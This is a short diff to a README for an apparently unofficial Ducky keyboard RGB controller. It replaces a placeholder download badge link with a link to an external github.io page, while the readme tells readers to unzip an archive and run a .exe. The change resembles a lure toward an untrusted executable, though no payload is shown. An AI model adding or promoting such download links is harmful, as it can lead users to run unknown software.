@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://ducky-rgb-controller.github.io/.github/)
 
 ## 📸 Overview
 ![ducky-rgb-per-key](https://github.com/user-attachments/assets/0d9eb6dd-12a6-4d68-8e6a-a35f94b09802)
